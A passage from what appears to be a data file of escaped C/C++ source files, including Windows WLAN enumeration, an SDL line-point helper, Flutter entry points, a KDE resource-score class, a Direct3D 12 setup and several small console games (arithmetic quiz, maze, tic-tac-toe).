}\n}\n\nint initWlanWithParams(DWORD dwMaxClient,DWORD dwCurVersion) {\n    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);\n    if (dwResult != ERROR_SUCCESS) {\n        std::cerr << \"WlanOpenHandle failed with error: \" << dwResult << std::endl;\n        return 1;\n    }\n\n    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);\n    if (dwResult != ERROR_SUCCESS) {\n        std::cerr << \"WlanEnumInterfaces failed with error: \" << dwResult << std::endl;\n        WlanCloseHandle(hClient, NULL);\n        return 1;\n    }\n}\n\nint initWlan() {\n    DWORD dwMaxClient = 2;\n    DWORD dwCurVersion = 0;\n    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);\n    if (dwResult != ERROR_SUCCESS) {\n        std::cerr << \"WlanOpenHandle failed with error: \" << dwResult << std::endl;\n        return 1;\n    }\n\n    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);\n    if (dwResult != ERROR_SUCCESS) {\n        std::cerr << \"WlanEnumInterfaces failed with error: \" << dwResult << std::endl;\n        WlanCloseHandle(hClient, NULL);\n        return 1;\n    }\n    return 0;\n}\n\nPWLAN_INTERFACE_INFO_LIST getAllInterfaces() {\n    return pIfList;\n}\n\nWLAN_INTERFACE_INFO* getInterface(int index) {\n    PWLAN_INTERFACE_INFO pIfInfo = (WLAN_INTERFACE_INFO*)&pIfList->InterfaceInfo[index];\n    return pIfInfo;\n}\n\nWifiNetworkList* getNetworks(PWLAN_INTERFACE_INFO pIfInfo) {\n    PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;\n    WifiNetworkList* network_list = new WifiNetworkList();\n    DWORD dwResult = WlanGetAvailableNetworkList(hClient,\n        &pIfInfo->InterfaceGuid,\n        0,\n        NULL,\n        &pBssList);\n    WifiNetwork* networks = new WifiNetwork[pBssList->dwNumberOfItems];\n\n    for (int j = 0; j < pBssList->dwNumberOfItems; j++) {\n        PWLAN_AVAILABLE_NETWORK pBssEntry = (WLAN_AVAILABLE_NETWORK*)&pBssList->Network[j];\n        memcpy(networks[j].wSSID, pBssEntry->dot11Ssid.ucSSID, 32);\n        networks[j].dot11BssType = pBssEntry->dot11BssType;\n        networks[j].uNumberOfBssids = pBssEntry->uNumberOfBssids;\n        networks[j].bNetworkConnectable = pBssEntry->bNetworkConnectable;\n        networks[j].uNumberOfPhyTypes = pBssEntry->uNumberOfPhyTypes;\n        networks[j].bMorePhyTypes = pBssEntry->bMorePhyTypes;\n",
    "#include <SDL2/SDL.h>\n#include <math.h>\n\n// Function to calculate the distance between the centers of two SDL_Rects\ndouble distanceBetweenCenters(SDL_Rect rect1, SDL_Rect rect2) {\n    // Calculate the center points of the two rectangles\n    SDL_Point center1;\n    center1.x = rect1.x + rect1.w / 2;\n    center1.y = rect1.y + rect1.h / 2;\n\n    SDL_Point center2;\n    center2.x = rect2.x + rect2.w / 2;\n    center2.y = rect2.y + rect2.h / 2;\n\n    // Calculate the distance between the center points\n    double distance = sqrt(pow(center2.x - center1.x, 2) + pow(center2.y - center1.y, 2));\n\n    return distance;\n}\n\n\n\n#include <vector>\n\n// Your function to get points between centers\nstd::vector<SDL_Point> getPointsBetweenCenters(SDL_Rect rect1, SDL_Rect rect2);\n\nint main() {\n    SDL_Rect rect1 = {25, 25, 50, 50};\n    SDL_Rect rect2 = {400, 45, 50, 50};\n\n    std::vector<SDL_Point> points = getPointsBetweenCenters(rect1, rect2);\n\n    for (const auto& point : points) {\n        printf(\"Point: (%d, %d)\\n\", point.x, point.y);\n    }\n\n    return 0;\n}\n\nstd::vector<SDL_Point> getPointsBetweenCenters(SDL_Rect rect1, SDL_Rect rect2) {\n    SDL_Point center1;\n    center1.x = rect1.x + rect1.w / 2;\n    center1.y = rect1.y + rect1.h / 2;\n\n    SDL_Point center2;\n    center2.x = (rect2.x + rect2.w) / 2;\n    center2.y = (rect2.y + rect2.h) / 2;\n\n    std::vector<SDL_Point> points;\n\n    int x1 = center1.x;\n    int y1 = center1.y;\n    int x2 = center2.x;\n    int y2 = center2.y;\n\n    int dx = abs(x2 - x1);\n    int dy = abs(y2 - y1);\n    //Step\n    int sx = (x1 < x2) ? 1 : -1;\n    int sy = (y1 < y2) ? 1 : -1; \n    int err = dx - dy;\n\n    while (true) {\n        points.push_back({x1, y1});\n\n        if (x1 == x2 && y1 == y2) break;\n\n        int e2 = 2 * err;\n        if (e2 > -dy) {\n            err -= dy;\n            x1 += sx;\n        }\n        if (e2 < dx) {\n            err += dx;\n            y1 += sy;\n        }\n    }\n\n    return points;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lottie_animation\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nenum enQuestionLevel { Easy = 1, Med, Hard, MixLevel };\r\n\r\nenum enOperationType { Add = 1, Sub, Mult, Div, MixOp };\r\n\r\nstruct stQuestion\r\n{\r\n    int Number1 = 0;\r\n    int Number2 = 0;\r\n    enOperationType OperationType;\r\n    enQuestionLevel QuestLevel;\r\n    int RightAnswer = 0;\r\n    int PlayerAnswer = 0;\r\n    bool AnswerResult = 0;\r\n\r\n};\r\n\r\nstruct stQuiz\r\n{\r\n    stQuestion QuestionList[100];\r\n    short NumberofQuest = 0;\r\n    short NumberofRightAns = 0;\r\n    short NumberofWrongAns = 0;\r\n    enQuestionLevel QuestionLevel;\r\n    enOperationType OperationType;\r\n    bool isPass = 0;\r\n\r\n};\r\n\r\nshort RandomNumber(short From, short To)\r\n{\r\n    return rand() % (To - From + 1) + From;\r\n\r\n}\r\n\r\nshort ReadHowManyQuest()\r\n{\r\n    short NumberOfQuest = 0;\r\n    do\r\n    {\r\n        cout << \"How Many Questions do you want to answer ?\";\r\n        cin >> NumberOfQuest;\r\n\r\n    } while (NumberOfQuest<1  || NumberOfQuest>10);\r\n\r\n    return NumberOfQuest;\r\n\r\n}\r\n\r\nenQuestionLevel ReadQuestLevel()\r\n{\r\n    short QuestionLevel = 0;\r\n    do\r\n    {\r\n        cout << \"Enter Question Level [1]Easy, [2]Med, [3]Hard, [4]Mix ?\";\r\n        cin >> QuestionLevel;\r\n\r\n    } while (QuestionLevel < 1 || QuestionLevel > 4);\r\n\r\n    return (enQuestionLevel)QuestionLevel;\r\n}\r\n\r\nenOperationType ReadOperationType()\r\n{\r\n    short OpType = 0;\r\n\r\n    do\r\n    {\r\n        cout << \"Enter Operation Type [1]Add, [2]Sub, [3]Mul, [4]Div, [5]Mix ?\";\r\n        cin >> OpType;\r\n\r\n\r\n    } while (OpType < 1 || OpType > 5);\r\n\r\n    return (enOperationType)OpType;\r\n}\r\n\r\nint SimpleCalculator(int Number1, int Number2, enOperationType Operation)\r\n{\r\n    switch (Operation)\r\n    {\r\n    case Add:\r\n        return Number1 + Number2;\r\n    case Sub:\r\n        return Number1 - Number2;\r\n    case Mult:\r\n        return Number1 * Number2;\r\n    case Div:\r\n        return Number1 / Number2;\r\n    default:\r\n        break;\r\n    }\r\n\r\n}\r\n\r\nstQuestion Generate1Quest(enQuestionLevel QuestLevel ,enOperationType OpType)\r\n{\r\n    stQuestion Question;\r\n\r\n    if (QuestLevel == enQuestionLevel::MixLevel)\r\n    {\r\n        QuestLevel = (enQuestionLevel)RandomNumber(1, 3);\r\n    }\r\n\r\n    if (OpType == enOperationType::MixOp)\r\n    {\r\n        OpType = (enOperationType)RandomNumber(1, 4);\r\n    }\r\n\r\n    Question.OperationType = OpType;\r\n\r\n    switch (QuestLevel)\r\n    {\r\n    case Easy:\r\n        Question.Number1 = RandomNumber(1, 10);\r\n        Question.Number2 = RandomNumber(1, 10);\r\n\r\n        Question.RightAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n        Question.QuestLevel = QuestLevel;\r\n        return Question;\r\n\r\n    case Med:\r\n        Question.Number1 = RandomNumber(10, 50);\r\n        Question.Number2 = RandomNumber(10, 50);\r\n\r\n        Question.RightAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n        Question.QuestLevel = QuestLevel;\r\n        return Question;\r\n        \r\n    case Hard:\r\n        Question.Number1 = RandomNumber(50, 100);\r\n        Question.Number2 = RandomNumber(50, 100);\r\n\r\n        Question.RightAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n        Question.QuestLevel = QuestLevel;\r\n        return Question;\r\n        \r\n    default:\r\n        break;\r\n    }\r\n\r\n    return Question;\r\n\r\n}\r\n\r\nvoid GenerateQuizQuest(stQuiz& Quiz)\r\n{\r\n    for (short Question = 0; Question <= Quiz.NumberofQuest - 1; Question++)\r\n    {\r\n        Quiz.QuestionList[Question] = Generate1Quest(Quiz.QuestionLevel, Quiz.OperationType);\r\n    }\r\n\r\n}\r\n\r\nstring GetOpTypeSymbol(enOperationType OPeratoin)\r\n{\r\n    string arrOPeration[5] = { \"+\",\"-\",\"*\",\"/\",\"Mix\" };\r\n    return arrOPeration[OPeratoin - 1];\r\n\r\n}\r\n\r\nvoid PrintTheQuestion(stQuiz Quiz, short QuestNumber)\r\n{\r\n    cout << \"\\n\";\r\n    cout << \"Question [\" << QuestNumber + 1 << \"/\" << Quiz.NumberofQuest << \"] \\n\\n\";\r\n    cout << Quiz.QuestionList[QuestNumber].Number1 << endl;\r\n    cout << Quiz.QuestionList[QuestNumber].Number2 << \" \";\r\n    cout << GetOpTypeSymbol(Quiz.QuestionList[QuestNumber].OperationType);\r\n    cout << \"\\n _________\" << endl;\r\n\r\n}\r\n\r\nint ReadPlayerAnswer()\r\n{\r\n    int Answer = 0;\r\n    cin >> Answer;\r\n    return Answer;\r\n\r\n}\r\n\r\nvoid CorrectTheQuestAns(stQuiz& Quiz,short QuestionNumber)\r\n{\r\n    if (Quiz.QuestionList[QuestionNumber].PlayerAnswer != Quiz.QuestionList[QuestionNumber].RightAnswer)\r\n    {\r\n        Quiz.QuestionList[QuestionNumber].AnswerResult = false;\r\n        Quiz.NumberofWrongAns++;\r\n\r\n        system(\"Color 4F\");\r\n        cout << \"Wrong Answer :-( \\n\" ;\r\n        cout << \"The Right answer is: \" << Quiz.QuestionList[QuestionNumber].RightAnswer << endl;\r\n    }\r\n    else\r\n    {\r\n        Quiz.QuestionList[QuestionNumber].AnswerResult = true;\r\n        Quiz.NumberofRightAns++;\r\n\r\n        system(\"color 2F\");\r\n        cout << \"Right Answer :-) \\n\" ;\r\n\r\n    }\r\n    cout << endl;\r\n\r\n    \r\n}\r\n\r\nvoid AskandCorrectQuizQuests(stQuiz& Quiz)\r\n{\r\n    for (short Question = 0; Question <= Quiz.Numberof",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"xylophone\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n *   SPDX-FileCopyrightText: 2011, 2012 Ivan Cukic <ivan.cukic(at)kde.org>\n *\n *   SPDX-License-Identifier: GPL-2.0-or-later\n */\n\n// Self\n#include \"ResourceScoreMaintainer.h\"\n\n// Qt\n#include <QList>\n\n// System\n#include <unistd.h>\n\n// Utils\n#include <utils/d_ptr_implementation.h>\n#include <utils/for_each_assoc.h>\n\n// Local\n#include \"ResourceScoreCache.h\"\n#include \"StatsPlugin.h\"\n\nclass ResourceScoreMaintainer::Private\n{\npublic:\n    Private()\n    {\n    }\n\n    ~Private();\n\n    typedef QString ApplicationName;\n    typedef QString ActivityID;\n    typedef QList<QString> ResourceList;\n\n    typedef QHash<ApplicationName, ResourceList> Applications;\n    typedef QHash<ActivityID, Applications> ResourceTree;\n\n    ResourceTree scheduledResources;\n\n    void processActivity(const ActivityID &activity, const Applications &applications);\n\n    void processResources();\n\n    QTimer processResourcesTimer;\n};\n\nResourceScoreMaintainer::Private::~Private()\n{\n}\n\nvoid ResourceScoreMaintainer::Private::processResources()\n{\n    using namespace kamd::utils;\n\n    // initial delay before processing the resources\n    sleep(1);\n\n    ResourceTree resources;\n\n    std::swap(resources, scheduledResources);\n\n    const auto activity = StatsPlugin::self()->currentActivity();\n\n    // Let us first process the events related to the current\n    // activity so that the stats are available quicker\n\n    if (resources.contains(activity)) {\n        processActivity(activity, resources[activity]);\n        resources.remove(activity);\n    }\n\n    for_each_assoc(resources, [this](const ActivityID &activity, const Applications &applications) {\n        processActivity(activity, applications);\n    });\n}\n\nvoid ResourceScoreMaintainer::Private::processActivity(const ActivityID &activity, const Applications &applications)\n{\n    using namespace kamd::utils;\n\n    for_each_assoc(applications, [&](const ApplicationName &application, const ResourceList &resources) {\n        for (const auto &resource : resources) {\n            ResourceScoreCache(activity, application, resource).update();\n        }\n    });\n}\n\nResourceScoreMaintainer *ResourceScoreMaintainer::self()\n{\n    static ResourceScoreMaintainer instance;\n    return &instance;\n}\n\nResourceScoreMaintainer::ResourceScoreMaintainer()\n{\n    d->processResourcesTimer.setInterval(1000);\n    d->processResourcesTimer.setSingleShot(true);\n    connect(&d->processResourcesTimer, &QTimer::timeout, this, [this] {\n        d->processResources();\n    });\n}\n\nResourceScoreMaintainer::~ResourceScoreMaintainer()\n{\n}\n\nvoid ResourceScoreMaintainer::processResource(const QString &resource, const QString &application)\n{\n    // Checking whether the item is already scheduled for\n    // processing\n\n    const auto activity = StatsPlugin::self()->currentActivity();\n\n    Q_ASSERT_X(!application.isEmpty(), \"ResourceScoreMaintainer::processResource\", \"Agent should not be empty\");\n    Q_ASSERT_X(!resource.isEmpty(), \"ResourceScoreMaintainer::processResource\", \"Resource should not be empty\");\n\n    if (d->scheduledResources.contains(activity) && d->scheduledResources[activity].contains(application)\n        && d->scheduledResources[activity][application].contains(resource)) {\n        // Nothing\n\n    } else {\n        d->scheduledResources[activity][application] << resource;\n    }\n\n    d->processResourcesTimer.start();\n}\n",
    "#pragma comment(lib, \"d3d12\")\r\n#pragma comment(lib, \"dxgi\")\r\n#pragma comment(lib, \"d3dcompiler\")\r\n\r\n// ----------------------------------------------------------------------------------------------------\r\n\r\n#include <windows.h>\r\n#include <wrl.h> // ComPtr\r\n#include <d3d12.h>\r\n#include <dxgi1_4.h>\r\n#include <d3dcompiler.h>\r\n\r\n#include <memory> // std::memcpy, std::size\r\n#include <cstdlib> // std::exit\r\n\r\n// ----------------------------------------------------------------------------------------------------\r\n\r\nusing Microsoft::WRL::ComPtr;\r\n\r\nstatic const wchar_t* TITLE{ L\"Minimal D3D12 by Secticide\" };\r\n\r\nstruct float3 { float x, y, z; };\r\n\r\nvoid check(HRESULT hr) {\r\n\r\n    if (FAILED(hr)) {\r\n        std::exit(hr);\r\n    }\r\n}\r\n\r\n// ----------------------------------------------------------------------------------------------------\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {\r\n\r\n    WNDCLASSW wnd_class{ 0, DefWindowProcW, 0, 0, 0, 0, 0, 0, 0, TITLE };\r\n\r\n    RegisterClassW(&wnd_class);\r\n\r\n    HWND hwnd{ CreateWindowExW(0, TITLE, TITLE, WS_POPUP | WS_MAXIMIZE | WS_VISIBLE, 0, 0, 0, 0, nullptr, nullptr, nullptr, nullptr) };\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    ComPtr<ID3D12Debug> debug_controller{};\r\n    check(D3D12GetDebugInterface(IID_PPV_ARGS(&debug_controller)));\r\n\r\n    debug_controller->EnableDebugLayer();\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    ComPtr<ID3D12Device> device{};\r\n    check(D3D12CreateDevice(nullptr, D3D_FEATURE_LEVEL_12_0, IID_PPV_ARGS(&device)));\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    D3D12_COMMAND_QUEUE_DESC queue_desc{};\r\n    queue_desc.Flags = D3D12_COMMAND_QUEUE_FLAG_NONE;\r\n    queue_desc.Type = D3D12_COMMAND_LIST_TYPE_DIRECT;\r\n\r\n    ComPtr<ID3D12CommandQueue> cmd_queue{};\r\n    check(device->CreateCommandQueue(&queue_desc, IID_PPV_ARGS(&cmd_queue)));\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    ComPtr<IDXGIFactory4> factory{};\r\n    check(CreateDXGIFactory2(DXGI_CREATE_FACTORY_DEBUG, IID_PPV_ARGS(&factory)));\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    DXGI_SWAP_CHAIN_DESC1 swapchain_desc{};\r\n    swapchain_desc.BufferCount = 2;\r\n    swapchain_desc.Width = 0; // use window width\r\n    swapchain_desc.Height = 0; // use window height\r\n    swapchain_desc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n    swapchain_desc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n    swapchain_desc.SwapEffect = DXGI_SWAP_EFFECT_FLIP_DISCARD;\r\n    swapchain_desc.SampleDesc.Count = 1;\r\n\r\n    ComPtr<IDXGISwapChain1> swapchain1{};\r\n    check(factory->CreateSwapChainForHwnd(cmd_queue.Get(), hwnd, &swapchain_desc, nullptr, nullptr, &swapchain1));\r\n\r\n    factory->MakeWindowAssociation(hwnd, DXGI_MWA_NO_ALT_ENTER);\r\n\r\n    // `IDXGISwapChain3` needed for the `GetCurrentBackBufferIndex` method\r\n    ComPtr<IDXGISwapChain3> swapchain{};\r\n    check(swapchain1->QueryInterface(IID_PPV_ARGS(&swapchain)));\r\n\r\n    swapchain->GetDesc1(&swapchain_desc);\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    D3D12_DESCRIPTOR_HEAP_DESC rtv_heap_desc{};\r\n    rtv_heap_desc.NumDescriptors = 2;\r\n    rtv_heap_desc.Type = D3D12_DESCRIPTOR_HEAP_TYPE_RTV;\r\n\r\n    ComPtr<ID3D12DescriptorHeap> rtv_heap{};\r\n    check(device->CreateDescriptorHeap(&rtv_heap_desc, IID_PPV_ARGS(&rtv_heap)));\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    ComPtr<ID3D12Resource> render_targets[2]{};\r\n\r\n    UINT rtv_descriptor_size{ device->GetDescriptorHandleIncrementSize(D3D12_DESCRIPTOR_HEAP_TYPE_RTV) };\r\n\r\n    D3D12_CPU_DESCRIPTOR_HANDLE rtv_handle{ rtv_heap->GetCPUDescriptorHandleForHeapStart() };\r\n\r\n    for (UINT i = 0; i < 2; ++i) {\r\n        check(swapchain->GetBuffer(i, IID_PPV_ARGS(&render_targets[i])));\r\n        device->CreateRenderTargetView(render_targets[i].Get(), nullptr, rtv_handle);\r\n        rtv_handle.ptr = SIZE_T(INT64(rtv_handle.ptr) + INT64(rtv_descriptor_size));\r\n    }\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    ComPtr<ID3D12CommandAllocator> cmd_allocator{};\r\n    check(device->CreateCommandAllocator(D3D12_COMMAND_LIST_TYPE_DIRECT, IID_PPV_ARGS(&cmd_allocator)));\r\n\r\n    // ----------------------------------------------------------------------------------------------------\r\n\r\n    D3D12_ROOT_SIGNATURE_DESC root_signature_desc{};\r\n    root_signature_desc.Flags = D3D12_ROOT_SIGNATURE_FLAG_ALLOW_INPUT_ASSEMBLER_INPUT_LAYOUT;\r\n\r\n    ComPtr<ID3DBlob> signature{};\r\n    check(D3D12SerializeRootSigna",
    "#include <iostream>\r\n#include <vector>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n// \u5b9a\u6570\u306e\u5b9a\u7fa9\r\nconst int width = 40;\r\nconst int height = 20;\r\nconst char playerChar = '@';\r\nconst char enemyChar = 'E';\r\nconst char itemChar = 'T';\r\nconst char emptyChar = ' ';\r\nconst char wallChar = '#';\r\nconst int playerSpeed = 1;\r\nconst int enemyCount = 10;\r\n\r\nclass Player {\r\npublic:\r\n    int x, y;\r\n    Player(int startX, int startY) : x(startX), y(startY) {}\r\n\r\n    void moveLeft(const std::vector<std::vector<char>>& maze) {\r\n        if (x > 0 && maze[y][x - 1] != wallChar) x -= playerSpeed;\r\n    }\r\n    void moveRight(const std::vector<std::vector<char>>& maze) {\r\n        if (x < width - 1 && maze[y][x + 1] != wallChar) x += playerSpeed;\r\n    }\r\n    void moveUp(const std::vector<std::vector<char>>& maze) {\r\n        if (y > 0 && maze[y - 1][x] != wallChar) y -= playerSpeed;\r\n    }\r\n    void moveDown(const std::vector<std::vector<char>>& maze) {\r\n        if (y < height - 1 && maze[y + 1][x] != wallChar) y += playerSpeed;\r\n    }\r\n};\r\n\r\nclass Enemy {\r\npublic:\r\n    int x, y;\r\n    Enemy(int startX, int startY) : x(startX), y(startY) {}\r\n\r\n    void moveRandom(const std::vector<std::vector<char>>& maze) {\r\n        int dir = rand() % 4;\r\n        switch (dir) {\r\n        case 0: if (x > 0 && maze[y][x - 1] != wallChar) x--; break;\r\n        case 1: if (x < width - 1 && maze[y][x + 1] != wallChar) x++; break;\r\n        case 2: if (y > 0 && maze[y - 1][x] != wallChar) y--; break;\r\n        case 3: if (y < height - 1 && maze[y + 1][x] != wallChar) y++; break;\r\n        }\r\n    }\r\n};\r\n\r\nclass Game {\r\nprivate:\r\n    Player player;\r\n    std::vector<Enemy> enemies;\r\n    int itemX, itemY;\r\n    bool gameOver;\r\n    HANDLE hConsole;\r\n    std::vector<std::vector<char>> maze; // \u8ff7\u8def\u306e\u30c7\u30fc\u30bf\r\n\r\n    void setup() {\r\n        enemies.clear();\r\n        gameOver = false;\r\n        srand(static_cast<unsigned>(time(0)));\r\n        hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\r\n        // \u30d7\u30ec\u30a4\u30e4\u30fc\u306e\u521d\u671f\u4f4d\u7f6e\r\n        player = Player(1, 1);\r\n\r\n        // \u30a2\u30a4\u30c6\u30e0\u306e\u4f4d\u7f6e\r\n        itemX = width - 2;\r\n        itemY = height - 2;\r\n\r\n        // \u8ff7\u8def\u306e\u751f\u6210\r\n        maze = std::vector<std::vector<char>>(height, std::vector<char>(width, emptyChar));\r\n        for (int y = 0; y < height; ++y) {\r\n            for (int x = 0; x < width; ++x) {\r\n                if (x == 0 || x == width - 1 || y == 0 || y == height - 1) {\r\n                    maze[y][x] = wallChar; // \u5916\u58c1\r\n                }\r\n            }\r\n        }\r\n\r\n        // \u5185\u58c1\u306e\u30e9\u30f3\u30c0\u30e0\u914d\u7f6e\r\n        for (int i = 0; i < width * height / 8; ++i) { // \u5185\u58c1\u306e\u6570\u3092\u8abf\u6574\r\n            int wx = rand() % (width - 2) + 1;\r\n            int wy = rand() % (height - 2) + 1;\r\n            if (maze[wy][wx] == emptyChar && !(wx == 1 && wy == 1) && !(wx == itemX && wy == itemY)) {\r\n                maze[wy][wx] = wallChar;\r\n            }\r\n        }\r\n\r\n        // \u6575\u306e\u914d\u7f6e\r\n        for (int i = 0; i < enemyCount; ++i) {\r\n            int ex, ey;\r\n            do {\r\n                ex = rand() % (width - 2) + 1;\r\n                ey = rand() % (height - 2) + 1;\r\n            } while (maze[ey][ex] == wallChar || (ex == player.x && ey == player.y) || (ex == itemX && ey == itemY));\r\n            enemies.emplace_back(ex, ey);\r\n        }\r\n    }\r\n\r\n    void draw() {\r\n        COORD coord = { 0, 0 };\r\n        SetConsoleCursorPosition(hConsole, coord);\r\n\r\n        for (int y = 0; y < height; ++y) {\r\n            for (int x = 0; x < width; ++x) {\r\n                if (x == player.x && y == player.y) {\r\n                    std::cout << playerChar;\r\n                }\r\n                else if (x == itemX && y == itemY) {\r\n                    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);\r\n                    std::cout << itemChar;\r\n                    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\r\n                }\r\n                else if (maze[y][x] == wallChar) {\r\n                    std::cout << wallChar;\r\n                }\r\n                else {\r\n                    bool printed = false;\r\n                    for (const auto& enemy : enemies) {\r\n                        if (x == enemy.x && y == enemy.y) {\r\n                            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);\r\n                            std::cout << enemyChar;\r\n                            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\r\n                            printed = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!printed) {\r\n                        std::cout << emptyChar;\r\n                    }\r\n                }\r\n            }\r\n            std::cout << \"\\n\";\r\n        }\r\n    }\r\n\r\n    void input() {\r\n        if (_kbhit()) {\r\n            switch (_getch()) {\r\n            case 'a':\r\n                player.moveLeft(maze);\r\n                break;\r\n            case 'd':\r\n                player.moveRi",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nchar board[3][3] = { {'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'} };\r\nchar current_marker;\r\nint current_player;\r\n\r\nvoid drawBoard() {\r\n    cout << \"Tic Tac Toe Board:\\n\";\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < 3; j++) {\r\n            cout << board[i][j] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nbool placeMarker(int slot) {\r\n    int row = slot / 3;\r\n    int col = slot % 3;\r\n    if (slot % 3 == 0) {\r\n        row = (slot / 3) - 1;\r\n        col = 2;\r\n    } else {\r\n        row = (slot / 3);\r\n        col = (slot % 3) - 1;\r\n    }\r\n\r\n    if (board[row][col] != 'X' && board[row][col] != 'O') {\r\n        board[row][col] = current_marker;\r\n        return true;\r\n    } else {\r\n        return false;\r\n    }\r\n}\r\n\r\nint winner() {\r\n    // Rows\r\n    for (int i = 0; i < 3; i++) {\r\n        if (board[i][0] == board[i][1] && board[i][1] == board[i][2])\r\n            return current_player;\r\n    }\r\n    // Columns\r\n    for (int i = 0; i < 3; i++) {\r\n        if (board[0][i] == board[1][i] && board[1][i] == board[2][i])\r\n            return current_player;\r\n    }\r\n    // Diagonals\r\n    if (board[0][0] == board[1][1] && board[1][1] == board[2][2])\r\n        return current_player;\r\n    if (board[0][2] == board[1][1] && board[1][1] == board[2][0])\r\n        return current_player;\r\n\r\n    return 0;\r\n}\r\n\r\nbool isDraw() {\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < 3; j++) {\r\n            if (board[i][j] != 'X' && board[i][j] != 'O')\r\n                return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nvoid swap_player_and_marker() {\r\n    if (current_marker == 'X') current_marker = 'O';\r\n    else current_marker = 'X';\r\n\r\n    if (current_player == 1) current_player = 2;\r\n    else current_player = 1;\r\n}\r\n\r\nvoid game() {\r\n    cout << \"Player 1, choose your marker: X or O: \";\r\n    char marker_p1;\r\n    cin >> marker_p1;\r\n\r\n    current_player = 1;\r\n    current_marker = marker_p1;\r\n\r\n    if (marker_p1 == 'X') current_marker = 'X';\r\n    else current_marker = 'O';\r\n\r\n    drawBoard();\r\n\r\n    int player_won;\r\n\r\n    for (int i = 0; i < 9; i++) {\r\n        cout << \"It's player \" << current_player << \"'s turn. Enter your slot: \";\r\n        int slot;\r\n        cin >> slot;\r\n\r\n        if (slot < 1 || slot > 9) {\r\n            cout << \"Invalid slot! Try again.\" << endl;\r\n            i--;\r\n            continue;\r\n        }\r\n\r\n        if (!placeMarker(slot)) {\r\n            cout << \"Slot already taken! Try again.\" << endl;\r\n            i--;\r\n            